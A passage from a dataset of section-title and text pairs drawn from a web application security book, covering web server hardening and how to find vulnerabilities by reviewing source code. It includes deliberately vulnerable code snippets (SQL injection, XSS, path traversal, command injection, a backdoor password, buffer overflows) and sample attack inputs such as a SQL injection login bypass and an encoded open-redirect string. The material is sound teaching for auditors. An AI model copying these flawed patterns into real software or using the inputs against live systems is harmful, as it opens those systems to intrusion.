researcher, who\nmay or may not have kept the information to herself. Other vulnerabilities are\ndrawn to the vendor’s attention because they are being actively exploited in\nthe wild. But in every case, as soon as a patch is released, any decent reverse\nengineer can quickly pinpoint the issue that it addresses, enabling attackers to\ndevelop exploits for the problem. Wherever feasible, therefore, security fixes\nshould be applied as soon as possible after they are made available.\n70779c17.qxd:WileyRed 9/14/07 3:15 PM Page 573\nChapter 17 ■ Attacking the Web Server 573\nPerform Security Hardening\nMost web servers have numerous configurable options controlling what func-\ntionality is enabled and how it behaves. If unused functionality, such as\ndefault ISAPI extensions, is left enabled, then your server is at an increased\nrisk of attack in the event that new vulnerabilities are discovered within that\nfunctionality. You should consult hardening guides specific to the software\nyou are using, but here are some generic steps to consider:\n■■ Disable any built-in functionality that is not required, and configure the\nremaining functionality to behave as restrictively as possible consistent\nwith your business requirements. This may include removing mapped\nfile extensions, web server modules, and database components. You can\nuse tools such as IIS Lockdown to facilitate this task.\n■■ Many functions and resources that you need to retain can often be\nrenamed from their default values to present an additional barrier to\nexploitation. Even if a skilled attacker may still be able to discover the\nnew name, this obscurity measure will defend against less skilled\nattackers and automated worms.\n■■ Apply the principle of least privilege throughout the technology stack.\nFor example, the web server process should be configured to use the\nleast powerful operating system account possible. On Unix-based sys-\ntems, a chrootedenvironment can be used to further contain the impact\nof any compromise.\nMonitor for New Vulnerabilities\nSomeone in your organization should be assigned the task of monitoring\nresources such as Bugtraq and Full Disclosure for announcements and discus-\nsion about new vulnerabilities in the software you are using. You can also sub-\nscribe to various private services to receive early notification of known\nvulnerabilities in software that have not yet been publicly disclosed. Very often,\nif you know the technical details of a vulnerability, you will be able to imple-\nment an effective work-around pending release of a full fix by the vendor.\nUse Defense-in-Depth\nYou should always implement layers of protection to mitigate the impact of a\nsecurity breach within any component of your infrastructure. There are vari-\nous steps you can take to help localize the impact of a successful attack on your\nweb server. Even in the event of a complete compromise, these may give you"
  },
  {
    "input": "Questions",
    "output": "70779c17.qxd:WileyRed 9/14/07 3:15 PM Page 574\n574 Chapter 17 ■ Attacking the Web Server\nsufficient time to respond to the incident before any significant data loss\noccurs:\n■■ You can impose restrictions on the web server’s capabilities from other,\nautonomous components of the application. For example, the database\naccount used by the application can be given only INSERTaccess to the\ntables used to store audit logs, meaning that an attacker who compro-\nmises the web server cannot delete any log entries that have already\nbeen created.\n■■ You can impose strict network-level filters on traffic to and from the\nweb server.\n■■ You can use an intrusion detection system to identify any anomalous\nnetwork activity that may indicate that a breach has occurred. After\ncompromising a web server, many attackers will immediately attempt\nto create a reverse connection out to the Internet, or scan for other hosts\non the DMZ network. An effective IDS will notify you of these events in\nreal time, enabling you to take measures to arrest the attack.\nChapter Summary\nAs with the other components on which a web application runs, the web\nserver represents a significant area of attack surface via which an application\nmay be compromised. Defects in a web server can often directly undermine an\napplication’s security, by giving access to directory listings, source code for\nexecutable pages, sensitive configuration and runtime data, and the ability to\nbypass input filters.\nBecause of the wide variety of different web server products and versions\nthat exist, locating web server vulnerabilities usually involves some recon-\nnaissance and research. However, this is one area in which automated scan-\nning tools can be highly effective at quickly locating known vulnerabilities\nwithin the configuration and software of the server you are attacking.\nQuestions\nAnswers can be found at www.wiley.com/go/webhacker.\n1. Under what circumstances will a web server display a directory listing?\n2. What are WebDAV methods used for, and why might they be dangerous?\n3. How could you exploit a web server that is configured to act as a web\nproxy?\n70779c17.qxd:WileyRed 9/14/07 3:15 PM Page 575\nChapter 17 ■ Attacking the Web Server 575\n4. What is the Oracle PL/SQL Exclusion List, and how can it be bypassed?\n5. If a web server allows access to its functionality over both HTTP and\nHTTPS, are there any advantages of using one protocol over the other\nwhen you are probing for vulnerabilities?\n70779c17.qxd:WileyRed 9/14/07 3:15 PM Page 576"
  },
  {
    "input": "Chapter 18: Finding Vulnerabilities in Source Code",
    "output": "70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 577\nCHAPTER\n18\nFinding Vulnerabilities\nin Source Code\nSo far, the attack techniques we have described have all involved interacting\nwith a live running application, and have largely consisted of submitting\ncrafted input to the application and monitoring its responses. In this chapter,\nwe will examine an entirely different approach to finding vulnerabilities—\nthat is, by reviewing the application’s source code.\nThere are various situations in which it may be possible to perform a source\ncode audit to assist you in attacking a target web application:\n■■ Some applications are open source, or use open source components,\nenabling you to download their code from the relevant repository and\nscour it for vulnerabilities.\n■■ If you are performing a penetration test in a consultancy context, the\napplication owner may grant you access to their source code in order to\nmaximize the effectiveness of your audit.\n■■ You may discover a file disclosure vulnerability within an application\nthat enables you to download its source code.\n■■ Most applications use some client-side code such as JavaScript, which is\naccessible without requiring any privileged access.\nIt is often perceived that to carry out a code review, it is necessary to be an\nexperienced programmer yourself and to have detailed knowledge of the\nlanguage being used. However, this need not be the case. Many higher-level\n577"
  },
  {
    "input": "Approaches to Code Review",
    "output": "70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 578\n578 Chapter 18 ■ Finding Vulnerabilities in Source Code\nlanguages can be read and understood by someone with very limited pro-\ngramming experience, and many types of vulnerabilities manifest them-\nselves in the same way across all of the languages commonly used for web\napplications. The majority of code reviews can be carried out using a stan-\ndard methodology, and you can rely upon a cheat sheet to help you under-\nstand the relevant syntax and APIs that are specific to the language and\nenvironment you are dealing with. This chapter will describe the core\nmethodology that you need to follow and provide cheat sheets for some of\nthe languages you are likely to encounter.\nApproaches to Code Review\nThere are a variety of approaches that you can take to carrying out a code\nreview, to help maximize your effectiveness in discovering security flaws\nwithin the time available. Further, you can often integrate your code review\nwith other test approaches to leverage the inherent strengths of each.\nBlack-Box vs. White-Box Testing\nThe attack methodology described in previous chapters is often labeled as a\nblack-box approach to testing, because it involves attacking the application\nfrom the outside, and monitoring its inputs and outputs, with no prior knowl-\nedge of its inner workings. In contrast, a white-boxapproach involves looking\ninside the application’s internals, with full access to design documentation,\nsource code, and other materials.\nPerforming a white-box code review can be a highly effective means of dis-\ncovering vulnerabilities within an application. With access to source code, it is\noften possible to quickly locate problems that would be extremely difficult or\ntime-consuming to detect using only black-box techniques. For example, a\nbackdoor password that grants access to any user account may be trivial to\nidentify by reading the code, but near impossible to detect using a password-\nguessing attack.\nHowever, code review is not normally an effective substitute for black-box\ntesting altogether. Of course, in one sense, all of the vulnerabilities within an\napplication are “in the source code,” so it must in principle be possible to\nlocate all of those vulnerabilities via code review. However, there are many\nvulnerabilities that can be discovered considerably more quickly and effi-\nciently using black-box methods. Using the automated fuzzing techniques\ndescribed in Chapter 13, it is possible to send hundreds of test cases per\nminute to an application, which will propagate through all relevant code paths\nand return a response immediately. By sending triggers for common vulnera-\nbilities to every field in every form, it is often possible to find within minutes\n70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 579\nChapter 18 ■ Finding Vulnerabilities in Source Code 579\na mass of problems that would take days to uncover via code review. Further,\nmany enterprise-class applications have an extremely complex structure with\nnumerous layers of processing of user-supplied input. Different controls and\nchecks are implemented at each layer, and what appears to be a clear vulnera-\nbility in one piece of source code may be fully mitigated by code elsewhere.\nIn most situations, black-box and white-box techniques can each comple-\nment and enhance the other. Often, having found a prima facie vulnerability\nthrough code review, the easiest and most effective means of establishing\nwhether it is real is to test for it on the running application. Conversely, having\nidentified some anomalous behavior on a running application, often the easi-\nest way to investigate its root cause is to review the relevant source code. If fea-\nsible, therefore, you should aim to combine a suitable mix of black- and\nwhite-box techniques, allowing the time and effort you devote to each to be\nguided by the application’s behavior during hands-on testing, and the size\nand complexity of the code base.\nCode Review Methodology\nAny reasonably functional application is likely to contain many thousands of\nlines of source code, and in most cases the time available for you to review it is\nlikely to be restricted, perhaps to only a few days. A key objective of effective\ncode review, therefore, is to identify as many security vulnerabilities as possi-\nble, given a certain amount of time and effort. To achieve this, it is necessary to\ntake a structured approach, using various techniques to ensure that the “low-\nhanging fruit” within the code base is quickly identified, leaving time to\nexplore for issues that are more subtle and harder to detect.\nIn the authors’ experience, a threefold approach to auditing a web applica-\ntion code base is effective in identifying vulnerabilities quickly and easily. This\nmethodology comprises the following elements:\n1. Tracing user-controllable data from its entry points into the application,\nand reviewing the code responsible for processing it.\n2. Searching the code base for signatures that may indicate the presence of\ncommon vulnerabilities, and reviewing these instances to determine\nwhether an actual vulnerability exists.\n3. Performing a line-by-line review of inherently risky code, to under-\nstand the application’s logic and find any problems that may exist\nwithin it. Functional components that may be selected for this close\nreview include the key security mechanisms within the application\n(authentication, session management, access control, and any applica-\ntion-wide input validation), interfaces to external components, and any\ninstances where native code is used (typically C/C++)."
  },
  {
    "input": "Signatures of Common Vulnerabilities",
    "output": "70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 580\n580 Chapter 18 ■ Finding Vulnerabilities in Source Code\nWe will begin by looking at the ways in which various common web appli-\ncation vulnerabilities appear at the level of source code and how these can be\nmost easily identified when performing a review. This will provide a means of\nsearching the code base for signatures of vulnerabilities (step 2) and of closely\nreviewing risky areas of code (step 3).\nWe will then look at some of the most popular web development languages in\nturn to identify the ways in which an application acquires user-submitted data\n(through request parameters, cookies, and so on), how it interacts with the user\nsession, the potentially dangerous APIs that exist within each language, and the\nways in which each language’s configuration and environment can affect the\nsecurity of the application. This will provide a means of tracing user-controllable\ndata from its entry point to the application (step 1) as well as providing some per-\nlanguage context to assist with the other methodology steps. Finally, we will dis-\ncuss some tools that are useful when performing code review.\nNOTE When carrying out a code audit, you should always bear in mind that\napplications may extend library classes and interfaces, may implement\nwrappers to standard API calls, and may implement custom mechanisms for\nsecurity-critical tasks such as storing per-session information. Before launching\ninto the detail of a code review, you should establish the extent of such\ncustomization, and tailor your approach to the review accordingly.\nSignatures of Common Vulnerabilities\nMany types of web application vulnerability have a fairly consistent signature\nwithin the code base, meaning that you can normally identify a good portion of\nan application’s vulnerabilities by quickly scanning and searching through the\ncode base. The examples presented here appear in various languages, but in\nmost cases the signature is language-neutral. What matters is the programming\ntechnique being employed, more than the actual APIs and syntax.\nCross-Site Scripting\nIn the most obvious examples of XSS, parts of the HTML returned to the user\nare explicitly constructed out of user-controllable data. Here, the target of an\nHREF link is constructed using strings taken directly from the query string in\nthe request:\nString link = “<a href=” + HttpUtility.UrlDecode(Request.QueryString\n[“refURL”]) + “&SiteID=” + SiteId + “&Path=” + HttpUtility.UrlEncode\n(Request.QueryString[“Path”]) + “</a>”;\nobjCell.InnerHtml = link;\n70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 581\nChapter 18 ■ Finding Vulnerabilities in Source Code 581\nThe usual remedy against cross-site scripting, which is to HTML-encode\npotentially malicious content, cannot be subsequently applied to the resulting\nconcatenated string because it already contains valid HTML mark-up—any\nattempt to sanitize the data would break the application by encoding the\nHTML which the application itself has specified. Hence, the example is cer-\ntainly vulnerable unless there are filters in place elsewhere that block requests\ncontaining XSS exploits within the query string. This filter-based approach to\nstopping XSS attacks is often flawed, and if it is present should be closely\nreviewed to identify any ways to work around it (see Chapter 12).\nIn more subtle cases, user-controllable data is used to set the value of a vari-\nable that is later used in building the response to the user. Here, the class mem-\nber variable m_pageTitleis set to a value taken from the request query string\nand will presumably be used later to create the <title> element within the\nreturned HTML page:\nprivate void setPageTitle(HttpServletRequest request) throws\nServletException\n{\nString requestType = request.getParameter(“type”);\nif (“3”.equals(requestType) && null!=request.getParameter(“title”))\nm_pageTitle = request.getParameter(“title”);\nelse m_pageTitle = “Online banking application”;\n}\nWhen you encounter code like this, you should closely review the process-\ning subsequently performed on the m_pageTitle variable and the way in\nwhich it is incorporated into the returned page, to determine whether the data\nis suitably encoded to prevent XSS attacks.\nThe preceding example clearly demonstrates the value of a code review in\nfinding some vulnerabilities. The XSS flaw can only be triggered if a different\nparameter (type) has a specific value (3). Standard fuzz testing and vulnera-\nbility scanning of the relevant request may well fail to detect the vulnerability.\nSQL Injection\nSQL injection vulnerabilities most commonly arise when various hard-coded\nstrings are concatenated with user-controllable data to form a SQL query,\nwhich is then executed within the database. Here, a query is constructed using\ndata taken directly from the request query string:\nStringBuilder SqlQuery = newStringBuilder(“SELECT name, accno FROM\nTblCustomers WHERE “ + SqlWhere);\n70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 582\n582 Chapter 18 ■ Finding Vulnerabilities in Source Code\nif(Request.QueryString[“CID”] != null &&\nRequest.QueryString[“PageId”] == “2”)\n{\nSqlQuery.Append(“ AND CustomerID = “);\nSqlQuery.Append(Request.QueryString[“CID”].ToString());\n}\n...\nA simple way to quickly identify this kind of low-hanging fruit within the\ncode base is to search the source for the hard-coded substrings, which are often\nused to construct queries out of user-supplied input. These substrings usually\nconsist of snippets of SQL and are quoted in the source, so it can be profitable\nto search for appropriate patterns comprising quotation marks, SQL key-\nwords, and spaces. For example:\n“SELECT\n“INSERT\n“DELETE\n“ AND\n“ OR\n“ WHERE\n“ ORDER BY\nIn each case, you should verify whether these strings are being concatenated\nwith user-controllable data in a way that introduces SQL injection vulnerabili-\nties. Because SQL keywords are processed in a case-insensitive manner, the\nsearches for these terms should also be case-insensitive. Note that a space may\nbe appended to each of these search terms to reduce the incidence of false pos-\nitives in the results.\nPath Traversal\nThe usual signature for path traversal vulnerabilities involves user- controllable\ninput being passed to a file system API without any validation of the input, or\nverification that an appropriate file has been selected. In the most common\ncase, user data is appended to a hard-coded or system-specified directory\npath, enabling an attacker to use dot-dot-slash sequences to step up the direc-\ntory tree to access files in other directories. For example:\npublic byte[] GetAttachment(HttpRequest Request)\n{\nFileStream fsAttachment = new FileStream(SpreadsheetPath +\nHttpUtility.UrlDecode(Request.QueryString[“AttachName”]),\nFileMode.Open, FileAccess.Read, FileShare.Read);\nbyte[] bAttachment = new byte[fsAttachment.Length];\nfsAttachment.Read(FileContent, 0,\n70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 583\nChapter 18 ■ Finding Vulnerabilities in Source Code 583\nConvert.ToInt32(fsAttachment.Length,\nCultureInfo.CurrentCulture));\nfsAttachment.Close();\nreturn bAttachment;\n}\nAny application functionality that enables users to upload or download files\nshould be closely reviewed to understand the manner in which file system\nAPIs are being invoked in response to user-supplied data, and determine\nwhether crafted input can be used to access files in an unintended location.\nOften, you can quickly identify relevant functionality by searching the code\nbase for the names of any query string parameters that relate to filenames\n(AttachName in the current example) and by searching for all file APIs in the\nrelevant language and reviewing the parameters passed to them. (See later\nsections for listings of the relevant APIs in common languages.)\nArbitrary Redirection\nVarious phishing vectors such as arbitrary redirects are often easy to spot\nthrough signatures in the source code. In this example, user-supplied data from\nthe query string is used to construct a URL to which the user is redirected:\nprivate void handleCancel()\n{\nhttpResponse.Redirect(HttpUtility.UrlDecode(Request.QueryString[\n“refURL”]) + “&SiteCode=” +\nRequest.QueryString[“SiteCode”].ToString() +\n“&UserId=” + Request.QueryString[“UserId”].ToString());\n}\nOften, arbitrary redirects are to be found by inspecting client-side code,\nwhich of course does not require any special access to the application’s inter-\nnals. Here, JavaScript is used to extract a parameter from the URL query string\nand ultimately redirect to it:\nurl = document.URL;\nindex = url.indexOf(‘?redir=’);\ntarget = unescape(url.substring(index + 7, url.length));\ntarget = unescape(target);\nif ((index = target.indexOf(‘//’)) > 0) {\ntarget = target.substring (index + 2, target.length);\nindex = target.indexOf(‘/’);\ntarget = target.substring(index, target.length);\n70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 584\n584 Chapter 18 ■ Finding Vulnerabilities in Source Code\n}\ntarget = unescape(target);\ndocument.location = target;\nAs you can see, the author of this script was aware that the script was a\npotential target for redirection attacks to an absolute URL on an external\ndomain. The script checks whether the redirection URL contains a double\nslash (as in http://) and, if so, skips past this to the first single slash, thereby\nconverting it into a relative URL. However, it then makes a final call to the\nunescape() function, which unpacks any URL-encoded characters. Perform-\ning canonicalization after validation often leads to a vulnerability (see Chapter\n2), and in this instance an attacker can cause a redirect to an arbitrary absolute\nURL with the following query string:\n?redir=http:%25252f%25252fwahh-attacker.com\nOS Command Injection\nCode that interfaces to external systems often contains signatures indicating\ncode injection flaws. In the following example, the messageand address para-\nmeters have been extracted from user-controllable form data, and are passed\ndirectly into a call to the Unix systemAPI:\nvoid send_mail(const char *message, const char *addr)\n{\nchar sendMailCmd[4096];\nsnprintf(sendMailCmd, 4096, “echo ‘%s’ | sendmail %s”, message,\naddr);\nsystem(sendMailCmd);\nreturn;\n}\nBackdoor Passwords\nUnless they have been deliberately concealed by a malicious programmer,\nbackdoor passwords that have been used for testing or administrative pur-\nposes usually stand out a mile when reviewing credential validation logic. For\nexample:\nprivate UserProfile validateUser(String username, String password)\n{\nUserProfile up = getUserProfile(username);\nif (checkCredentials(up, password) ||\n“oculiomnium”.equals(password))\n70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 585\nChapter 18 ■ Finding Vulnerabilities in Source Code 585\nreturn up;\nreturn null;\n}\nOther items that may be easily identified in this way include unreferenced\nfunctions and hidden debug parameters.\nNative Software Bugs\nAny native code used by the application should be closely reviewed for classic\nvulnerabilities that may be exploitable to execute arbitrary code.\nBuffer Overflow Vulnerabilities\nThese typically employ one of the unchecked APIs for buffer manipulation, of\nwhich there is a very large number, including strcpy, strcat, memcpy, and\nsprintf, together with their wide-char and other variants. An easy way to\nidentify low hanging fruit within the code base is to search for all uses of these\nAPIs and verify whether (a) the source buffer is user-controllable and (b) the\ncode has explicitly ensured that the destination buffer is sufficiently large to\naccommodate data being copied into it (because the API itself does not do so).\nVulnerable calls to unsafe APIs are often very easy to identify. In the follow-\ning example, the user-controllable string pszName is copied into a fixed-size\nstack-based buffer without checking that the buffer is large enough to accom-\nmodate it:\nBOOL CALLBACK CFiles::EnumNameProc(LPTSTR pszName)\n{\nchar strFileName[MAX_PATH];\nstrcpy(strFileName, pszName);\n...\n}\nNote that just because a safe alternative to an unchecked API is employed,\nthis is no guarantee that a buffer overflow will not occur. Sometimes, due to a\nslip or a misunderstanding, a checked API is used in an unsafe manner, as in\nthe following “fix” of the preceding vulnerability:\nBOOL CALLBACK CFiles::EnumNameProc(LPTSTR pszName)\n{\nchar strFileName[MAX_PATH];\nstrncpy(strFileName, pszName, strlen(pszName));\n...\n}\n70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 586\n586 Chapter 18 ■ Finding Vulnerabilities in Source Code\nTherefore, a thorough code audit for buffer overflow vulnerabilities typi-\ncally entails a close line-by-line review of the entire code base, tracing every\noperation performed on user-controllable data.\nInteger Vulnerabilities\nThese come in many forms and can be extremely subtle, but some instances are\neasy to identify from signatures within the source code.\nComparisons between signed and unsigned integers often lead to problems.\nIn the following “fix” to the previous vulnerability, a signed integer (len) is\ncompared with an unsigned integer (sizeof(strFileName)). If the user can\nengineer a situation where lenhas a negative value, this comparison will suc-\nceed, and the unchecked strcpywill still occur:\nBOOL CALLBACK CFiles::EnumNameProc(LPTSTR pszName, int len)\n{\nchar strFileName[MAX_PATH];\nif (len < sizeof(strFileName))\nstrcpy(strFileName, pszName);\n...\n}\nFormat String Vulnerabilities\nThese can typically be quickly identified by looking for uses of the printfand\nFormatMessage families of functions where the format string parameter is not\nhard-coded but is user-controllable, such as the following call to fprintf:\nvoid logAuthenticationAttempt(char* username);\n{\nchar tmp[64];\nsnprintf(tmp, 64, “login attempt for: %s\\n”, username);\ntmp[63] = 0;\nfprintf(g_logFile, tmp);\n}\nSource Code Comments\nMany software vulnerabilities are actually documented within source\ncode comments. This often occurs because developers are aware that a partic-\nular operation is unsafe, and record a reminder to fix the problem later, which"
  },
  {
    "input": "The Java Platform",
    "output": "70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 587\nChapter 18 ■ Finding Vulnerabilities in Source Code 587\nthey never get around to doing. In other cases, testing has identified some\nanomalous behavior within the application, which has been commented\nwithin the code but never fully investigated.\nFor example, the authors encountered the following within an application’s\nproduction code:\nchar buf[200]; // I hope this is big enough\n...\nstrcpy(buf, userinput);\nSearching a large code base for comments indicating common problems is\nfrequently an effective source of low-hanging fruit. Here are some search\nterms which have proven to be useful:\nbug\nproblem\nbad\nhope\ntodo\nfix\noverflow\ncrash\ninject\nxss\ntrust\nThe Java Platform\nThis section describes methods of acquiring user-supplied input, ways of\ninteracting with the user’s session, the potentially dangerous APIs that exist,\nand security-relevant configuration options on the Java platform.\nIdentifying User-Supplied Data\nJava applications acquire user-submitted input via the javax.servlet\n.http.HttpServletRequest interface, which extends the javax.servlet\n.ServletRequest interface. These two interfaces contain numerous APIs\nwhich web applications can use for accessing user-supplied data. The APIs\nlisted in Table18-1 can be used to obtain data from the user request.\n70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 588\n588 Chapter 18 ■ Finding Vulnerabilities in Source Code\nTable18-1: APIs Used to Acquire User-Supplied Data on the Java Platform\ngetParameter Parameters within the URL query string and the\nbody of a POSTrequest are stored as a map of\ngetParameterNames\nStringnames to Stringvalues, which can be\ngetParameterValues accessed using these APIs.\ngetParameterMap\ngetQueryString Returns the entire query string contained within the\nrequest and can be used as an alternative to the\ngetParameterAPIs.\ngetHeader HTTP headers in the request are stored as a map of\nStringnames to Stringvalues and can be\ngetHeaders\naccessed using these APIs.\ngetHeaderNames\ngetRequestURI These APIs return the URL contained within the\nrequest, including the query string.\ngetRequestURL\ngetCookies Returns an array of Cookieobjects, which contain\ndetails of the cookies received in the request,\nincluding their names and values.\ngetRequestedSessionId Used as an alternative to getCookiesin some\ncases; returns the session ID value submitted within\nthe request\ngetInputStream These APIs return different representations of the\nraw request received from the client and so can be\nused to access any of the information obtained by\nall of the other APIs.\ngetReader\ngetMethod Returns the method used in the HTTP request.\ngetProtocol Returns the protocol used in the HTTP request.\ngetServerName Returns the value of the HTTP Host header.\ngetRemoteUser If the current user is authenticated, these return\ndetails of the user, including his login name. If users\ngetUserPrincipal\nare able to choose their own username during self-\nregistration, this may be a means of introducing\nmalicious input into the application’s processing.\n70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 589\nChapter 18 ■ Finding Vulnerabilities in Source Code 589\nSession Interaction\nJava Platform applications use the javax.servlet.http.HttpSession inter-\nface to store and retrieve information within the current session. Per-session\nstorage is a map of string names to object values. The APIs listed in Table18-2\nare used to store and retrieve data within the session.\nTable18-2: APIs Used to Interact with the User’s Session on the Java Platform\nsetAttribute Used to store data within the current session.\nputValue\ngetAttribute Used to query data stored within the current session.\ngetValue\ngetAttributeNames\ngetValueNames\nPotentially Dangerous APIs\nThis section describes some common Java APIs that can introduce security\nvulnerabilities if used in an unsafe manner.\nFile Access\nThe main class used for accessing files and directories in Java is java.io.File.\nFrom a security perspective, the most interesting uses of the class are calls to\nits constructor, which may take a parent directory and filename, or simply a\npathname.\nWhichever form of the constructor is used, path traversal vulnerabilities\nmay exist if user-controllable data is passed as the filename parameter without\nchecking for dot-dot-slash sequences. For example, the following code will\nopen a file in the root of the C:\\drive on Windows:\nString userinput = “..\\\\boot.ini”;\nFile f = new File(“C:\\\\temp”, userinput);\nThe classes most commonly used for reading and writing file contents in\nJava are:\n■■ java.io.FileInputStream\n■■ java.io.FileOutputStream\n70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 590\n590 Chapter 18 ■ Finding Vulnerabilities in Source Code\n■■ java.io.FileReader\n■■ java.io.FileWriter\nThese classes take a Fileobject in their constructors or may open a file them-\nselves via a filename string, which may again introduce path traversal vulnera-\nbilities if user-controllable data is passed as this parameter. For example:\nString userinput = “..\\\\boot.ini”;\nFileInputStream fis = new FileInputStream(“C:\\\\temp\\\\” + userinput);\nDatabase Access\nThe following are the APIs most commonly used for executing an arbitrary\nString as a SQL query:\n■■ java.sql.Connection.createStatement\n■■ java.sql.Statement.execute\n■■ java.sql.Statement.executeQuery\nIf user-controllable input is part of the String being executed as a query, then\nit is probably vulnerable to SQL injection. For example:\nString username = “admin’ or 1=1--”;\nString password = “foo”;\nStatement s = connection.createStatement();\ns.executeQuery(“SELECT * FROM users WHERE username = ‘“ + username +\n“‘ AND password = ‘“ + password + “‘“);\nwhich executes the unintended query\nSELECT * FROM users WHERE username = ‘admin’ or 1=1--’ AND password = ‘foo’\nThe following APIs are a more robust and secure alternative to the ones previ-\nously described, and allow an application to create a precompiled SQL statement\nand set the value of its parameter placeholders in a secure and typesafe way:\n■■ java.sql.Connection.prepareStatement\n■■ java.sql.PreparedStatement.setString\n■■ java.sql.PreparedStatement.setInt\n■■ java.sql.PreparedStatement.setBoolean\n■■ java.sql.PreparedStatement.setObject\n70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 591\nChapter 18 ■ Finding Vulnerabilities in Source Code 591\n■■ java.sql.PreparedStatement.execute\n■■ java.sql.PreparedStatement.executeQuery\nand so on.\nIf used as intended, these are not vulnerable to SQL injection. For example:\nString username = “admin’ or 1=1--”;\nString password = “foo”;\nStatement s = connection.prepareStatement(\n“SELECT * FROM users WHERE username = ? AND password = ?”);\ns.setString(1, username);\ns.setString(2, password);\ns.executeQuery();\nwhich results in a query that is equivalent to\nSELECT * FROM users WHERE username = ‘admin’’ or 1=1--’ AND password =\n‘foo’\nDynamic Code Execution\nThe Java language itself does not contain any mechanism for dynamic evalua-\ntion of Java source code, although some implementations (notably within\ndatabase products) provide a facility to do this. If the application you are\nreviewing constructs any Java code on the fly, you should understand the way\nin which this is done and determine whether any user-controllable data is\nbeing used in an unsafe way.\nOS Command Execution\nThe following APIs are the means of executing external operating system com-\nmands from within a Java application:\n■■ java.lang.runtime.Runtime.getRuntime\n■■ java.lang.runtime.Runtime.exec\nIf the string parameter passed to execcan be fully controlled by the user, then\nthe application is almost certainly vulnerable to arbitrary command execution.\nFor example, the following will cause the Windows calcprogram to run:\nString userinput = “calc”;\nRuntime.getRuntime.exec(userinput);\nHowever, if the user only controls part of the string passed to exec,\nthen the application may not be vulnerable. In the following example, the\n70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 592\n592 Chapter 18 ■ Finding Vulnerabilities in Source Code\nuser-controllable data is passed as command-line arguments to the notepad\nprocess, causing it to attempt to load a document called | calc:\nString userinput = “| calc”;\nRuntime.getRuntime.exec(“notepad “ + userinput);\nThe execAPI itself does not interpret shell metacharacters such as &and |,\nand so this attack fails.\nSometimes, controlling only part of the string passed to exec may still be\nsufficient for arbitrary command execution, as in the following subtly different\nexample (note the missing space after notepad):\nString userinput = “\\\\..\\\\system32\\\\calc”;\nRuntime.getRuntime().exec(“notepad” + userinput);\nOften, in this type of situation, the application will be vulnerable to some-\nthing other than code execution. For example, if an application executes the\nprogram wget with a user-controllable parameter as the target URL, then an\nattacker may be able to pass dangerous command-line arguments to the wget\nprocess—for example, causing it to download a document and save it to an\narbitrary location in the file system.\nURL Redirection\nThe following APIs can be used to issue an HTTP redirect in Java:\n■■ javax.servlet.http.HttpServletResponse.sendRedirect\n■■ javax.servlet.http.HttpServletResponse.setStatus\n■■ javax.servlet.http.HttpServletResponse.addHeader\nThe usual means of causing a redirect response is via the sendRedirect\nmethod, which takes a string containing a relative or absolute URL. If the\nvalue of this string is user-controllable, then the application is probably vul-\nnerable to a phishing vector.\nYou should also be sure to review any uses of the setStatusand addHeader\nAPIs. Given that a redirect simply involves a 3xx response containing an HTTP\nLocation header, an application may implement redirects using these APIs.\nSockets\nThe java.net.Socketclass takes various forms of target host and port details\nin its constructors, and if the parameters passed are user-controllable in any\nway, then the application may be exploitable to cause network connections to\narbitrary hosts, either on the Internet or on the private DMZ or internal net-\nwork on which the application is hosted.\n70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 593\nChapter 18 ■ Finding Vulnerabilities in Source Code 593\nConfiguring the Java Environment\nThe web.xmlfile contains configuration settings for the Java Platform environ-\nment, and controls how applications behave. If an application is using\ncontainer-managed security, authentication and authorization will be declared\nin web.xmlagainst each resource or collection of resources to be secured, out-\nside the application code. Configuration options that may be set in the web.xml\nfile are shown in Table18-3.\nServlets can enforce programmatic checks with HttpServletRequest\n.isUserInRole to access the same role information from within the Servlet\ncode. A mapping entry security-role-ref is used to link the built-in role\ncheck with the corresponding container role.\nIn addition to web.xml, different application servers may use secondary\ndeployment files (for example, weblogic.xml) containing other security-\nr elevant settings, and these should be included when examining the environ-\nment’s configuration.\nTable18-3: Security-Relevant Configuration Settings for the Java Environment\nlogin-config Authentication details can be configured within the\nlogin-configelement.\nThe two categories of authentication are forms-based\n(the page is specified by the form-login-page\nelement) and Basic Author Client-Cert, specified\nwithin the auth-methodelement.\nIf forms-based authentication is used, the specified form\nmust have the action defined as j_security_check\nand must submit the parameters j_usernameand\nj_password. Java applications will recognize this as a\nlogin request.\nsecurity-constraint If the login-configelement is defined, resources can\nbe restricted using the security-constraint\nelement. This can be used to define the resources to be\nprotected.\nWithin the security-constraintelement, resource\ncollections can be defined using the url-pattern\nelement. For example:\n<url-pattern>/admin/*</url-pattern>\nThese are accessible to those roles and principals\ndefined in the role-nameand principal-name\nelements, respectively.\nsession-config Session timeout (in minutes) can be configured within\nthe session-timeoutelement.\nContinued"
  },
  {
    "input": "ASP.NET",
    "output": "70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 594\n594 Chapter 18 ■ Finding Vulnerabilities in Source Code\nTable18-3 (continued)\nerror-page The application’s error handling is defined within the\nerror-pageelement. HTTP error codes and Java\nexceptions can be handled on an individual basis\nthrough the error-codeand exception-type\nelements.\ninit-param Various initialization parameters are configured within\nthe init-paramelement. These may include security-\nspecific settings, including:\n■■ listings, which should be set to false.\n■■ debug, which should be set to 0.\nASP.NET\nThis section describes methods of acquiring user-supplied input, ways of\ninteracting with the user’s session, the potentially dangerous APIs that exist,\nand security-relevant configuration options on the ASP.NET platform.\nIdentifying User-Supplied Data\nASP.NET applications acquire user-submitted input via the System.Web\n.HttpRequestclass. This contains numerous properties and methods that web\napplications can use for accessing user-supplied data. The APIs listed in\nTable18-4 can be used to obtain data from the user request.\nTable18-4: APIs Used to Acquire User-Supplied Data on the ASP.NET Platform\nParams Parameters within the URL query string, the body of a\nPOSTrequest, HTTP cookies, and miscellaneous server\nvariables are stored as maps of 